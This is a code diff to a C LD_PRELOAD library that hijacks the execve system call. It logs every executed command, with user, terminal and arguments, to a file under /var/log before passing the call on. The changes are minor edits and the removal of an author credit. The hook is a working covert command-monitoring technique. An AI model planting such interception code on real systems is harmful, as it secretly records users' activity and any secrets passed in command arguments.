@@ -7,10 +7,11 @@
 #include <dlfcn.h>
 #include <time.h>
 #include <pwd.h>
+#include <sys/types.h>
 
-#define LOG_FILE "/var/log/devil_logs.txt"  
+#define LOG_FILE "/var/log/devil_logs.txt" 
+
 static int (*original_execve)(const char *, char *const[], char *const[]) = NULL;
-
 
 const char *get_tty() {
     char *tty = ttyname(STDIN_FILENO);
@@ -19,12 +20,15 @@ const char *get_tty() {
     return (tty) ? tty : "hidden shell";
 }
 
-
 void log_command(const char *pathname, char *const argv[]) {
     FILE *logfile = fopen(LOG_FILE, "a");
+    
     if (!logfile) {
-        perror("Failed to open log file");
-        return;
+        logfile = fopen(LOG_FILE, "a");
+        if (!logfile) {
+            perror("LOL!!! NOPE");
+            return;
+        }
     }
 
     time_t now = time(NULL);
@@ -39,9 +43,7 @@ void log_command(const char *pathname, char *const argv[]) {
     const char *cmd_name = strrchr(pathname, '/');
     cmd_name = (cmd_name) ? cmd_name + 1 : pathname;
 
-
     fprintf(logfile, "=============================================\n");
-    fprintf(logfile, "Created by Devilx0x1 / Bypasser0x1\n");
     fprintf(logfile, "[%s] USER: %s | TTY: %s | CMD: %s", timestamp, user, tty, cmd_name);
 
     for (int i = 1; argv[i] != NULL; i++) {
@@ -52,13 +54,13 @@ void log_command(const char *pathname, char *const argv[]) {
     fclose(logfile);
 }
 
-
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
     if (!original_execve) {
         original_execve = dlsym(RTLD_NEXT, "execve");
     }
 
     log_command(pathname, argv);
+
     return original_execve(pathname, argv, envp);
 }
 
